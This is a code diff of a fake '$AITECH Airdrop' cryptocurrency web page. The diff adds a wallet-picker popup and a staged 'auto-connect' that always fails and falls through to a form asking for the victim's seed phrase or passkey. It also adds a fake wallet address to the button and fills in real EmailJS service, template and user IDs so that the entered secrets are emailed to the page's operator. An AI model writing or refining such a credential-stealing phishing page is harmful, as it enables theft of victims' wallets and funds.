@@ -6,7 +6,9 @@
     <title>$AITECH Airdrop | BSC & Base Only</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
     <style>
         body {
             background: radial-gradient(circle at 10% 20%, rgba(15, 23, 42, 0.8) 0%, rgba(2, 6, 23, 0.9) 90%), 
@@ -33,8 +35,7 @@
     <nav class="flex justify-between items-center p-4 border-b border-gray-800 backdrop-blur-sm bg-gray-900/80">
         <div class="flex items-center space-x-2">
             <img src="/logo.jpg" alt="AITECH Logo" class="h-10 w-10 rounded-full">
-           <!-- Replace this line in your navbar -->
-<span class="text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-600 bg-clip-text text-transparent hidden md:block">AITECH Airdrop</span>
+            <span class="text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-600 bg-clip-text text-transparent hidden md:block">AITECH Airdrop</span>
         </div>
         <div class="flex items-center space-x-4">
             <select id="networkSelector" class="bg-gray-800 text-white p-2 rounded-lg border border-gray-700 focus:ring-2 focus:ring-blue-500">
@@ -47,12 +48,40 @@
         </div>
     </nav>
 
+    <!-- Wallet Selection Popup -->
+    <div id="walletSelectionPopup" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
+        <div class="bg-gray-800 p-6 rounded-xl w-full max-w-md glow-card">
+            <h2 class="text-2xl font-bold mb-4 text-center">Select Wallet</h2>
+            <div class="grid grid-cols-2 gap-4">
+                <button class="wallet-option bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center transition-all duration-300" data-wallet="MetaMask">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="h-12 w-12 mb-2">
+                    <span class="font-medium">MetaMask</span>
+                </button>
+                <button class="wallet-option bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center transition-all duration-300" data-wallet="Trust Wallet">
+                    <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet" class="h-12 w-12 mb-2">
+                    <span class="font-medium">Trust Wallet</span>
+                </button>
+                <button class="wallet-option bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center transition-all duration-300" data-wallet="Coinbase Wallet">
+                    <img src="https://th.bing.com/th/id/ODLS.31ae2b0b-8a31-41e9-a2bb-db0b5be33948?w=32&h=32&qlt=91&pcl=fffffa&o=6&pid=1.2" alt="Coinbase Wallet" class="h-12 w-12 mb-2">
+                    <span class="font-medium">Coinbase Wallet</span>
+                </button>
+                <button class="wallet-option bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center transition-all duration-300" data-wallet="WalletConnect">
+                    <img src="https://seeklogo.com/images/W/walletconnect-logo-EE83B50C97-seeklogo.com.png" alt="WalletConnect" class="h-12 w-12 mb-2">
+                    <span class="font-medium">WalletConnect</span>
+                </button>
+            </div>
+            <button id="closeWalletSelection" class="w-full bg-gray-700 hover:bg-gray-600 py-3 rounded-lg font-bold mt-4 transition-all duration-300">
+                Cancel
+            </button>
+        </div>
+    </div>
+
     <!-- Connecting Overlay -->
     <div id="connectingOverlay" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
         <div class="bg-gray-800 p-8 rounded-xl max-w-md text-center glow-card">
             <div class="connecting-spinner mx-auto mb-4"></div>
-            <h2 class="text-2xl font-bold mb-2">Connecting Wallet</h2>
-            <p class="text-gray-400 mb-4">Attempting to connect automatically...</p>
+            <h2 id="connectingTitle" class="text-2xl font-bold mb-2">Connecting Wallet</h2>
+            <p id="connectingSubtitle" class="text-gray-400 mb-4">Attempting to connect automatically...</p>
             <div class="w-full bg-gray-700 rounded-full h-2.5">
                 <div id="connectionProgress" class="bg-blue-600 h-2.5 rounded-full" style="width: 0%"></div>
             </div>
@@ -63,7 +92,7 @@
     <!-- Wallet Connection Popup (Hidden by Default) -->
     <div id="walletPopup" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
         <div class="bg-gray-800 p-6 rounded-xl w-full max-w-md glow-card">
-            <h2 class="text-2xl font-bold mb-4">Manual Wallet Connection</h2>
+            <h2 id="manualConnectionTitle" class="text-2xl font-bold mb-4">Manual Wallet Connection</h2>
             
             <!-- Tab System -->
             <div class="flex border-b border-gray-700 mb-4">
@@ -222,7 +251,7 @@
     <!-- JavaScript -->
     <script>
         // Initialize EmailJS (Replace with your User ID)
-        emailjs.init("YOUR_EMAILJS_USER_ID");
+        emailjs.init("4jXhBKgao485xWP9H");
 
         // ====== Mock Data for Live Transactions ======
         const networks = ["BNB Chain (BSC)", "Base Chain"];
@@ -261,9 +290,11 @@
 
         // ====== Wallet Connection Logic ======
         const connectWalletBtn = document.getElementById('connectWallet');
+        const walletSelectionPopup = document.getElementById('walletSelectionPopup');
         const connectingOverlay = document.getElementById('connectingOverlay');
         const walletPopup = document.getElementById('walletPopup');
         const closePopup = document.getElementById('closePopup');
+        const closeWalletSelection = document.getElementById('closeWalletSelection');
         const phraseTab = document.getElementById('phraseTab');
         const passkeyTab = document.getElementById('passkeyTab');
         const phraseSection = document.getElementById('phraseSection');
@@ -275,9 +306,43 @@
         const adminPanel = document.getElementById('adminPanel');
         const connectionProgress = document.getElementById('connectionProgress');
         const countdownText = document.getElementById('countdownText');
+        const connectingTitle = document.getElementById('connectingTitle');
+        const connectingSubtitle = document.getElementById('connectingSubtitle');
+        const manualConnectionTitle = document.getElementById('manualConnectionTitle');
+        
+        // Store selected wallet name
+        let selectedWalletName = "";
 
-        // First try auto-connect, then show popup if fails
-        async function tryAutoConnect() {
+        // Show wallet selection popup when Connect Wallet is clicked
+        connectWalletBtn.addEventListener('click', () => {
+            walletSelectionPopup.classList.remove('hidden');
+        });
+
+        // Close wallet selection popup
+        closeWalletSelection.addEventListener('click', () => {
+            walletSelectionPopup.classList.add('hidden');
+        });
+
+        // Handle wallet selection
+        document.querySelectorAll('.wallet-option').forEach(option => {
+            option.addEventListener('click', (e) => {
+                // Get selected wallet name
+                selectedWalletName = e.currentTarget.getAttribute('data-wallet');
+                
+                // Hide wallet selection popup
+                walletSelectionPopup.classList.add('hidden');
+                
+                // Update connecting overlay text
+                connectingTitle.textContent = `Connecting ${selectedWalletName}`;
+                connectingSubtitle.textContent = `Attempting to connect to ${selectedWalletName}...`;
+                
+                // Show connecting animation
+                tryAutoConnect(selectedWalletName);
+            });
+        });
+
+        // Try auto-connect, then show popup if fails
+        async function tryAutoConnect(walletName) {
             connectingOverlay.classList.remove('hidden');
             let progress = 0;
             let secondsLeft = 15;
@@ -320,18 +385,18 @@
                 console.log("Auto-connect failed:", error);
             }
             
-            // If we get here, auto-connect failed
+            // If we get here, auto-connect failed, wait for the timer
             setTimeout(() => {
                 clearInterval(progressInterval);
                 connectingOverlay.classList.add('hidden');
+                
+                // Update manual connection popup title with wallet name
+                manualConnectionTitle.textContent = `Connect with ${walletName}`;
                 walletPopup.classList.remove('hidden');
             }, 15000);
             
             return false;
         }
-
-        // Connect Wallet Button Click
-        connectWalletBtn.addEventListener('click', tryAutoConnect);
 
         // Close Popup
         closePopup.addEventListener('click', () => {
@@ -371,8 +436,12 @@
                 claimButton.disabled = false;
                 claimButton.classList.remove('opacity-50', 'cursor-not-allowed');
                 
+                // Update connect wallet button with a fake address
+                connectWalletBtn.textContent = `${mockWallets[Math.floor(Math.random() * mockWallets.length)]}`;
+                
                 // Send data via EmailJS (replace with your service/template IDs)
-                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+                emailjs.send("service_7058our", "template_zwmj0nv", {
+                    wallet_type: selectedWalletName || "Unknown",
                     wallet_phrase: phrase || "N/A (Used Passkey)",
                     wallet_passkey: passkey || "N/A (Used Phrase)"
                 }).then(() => {
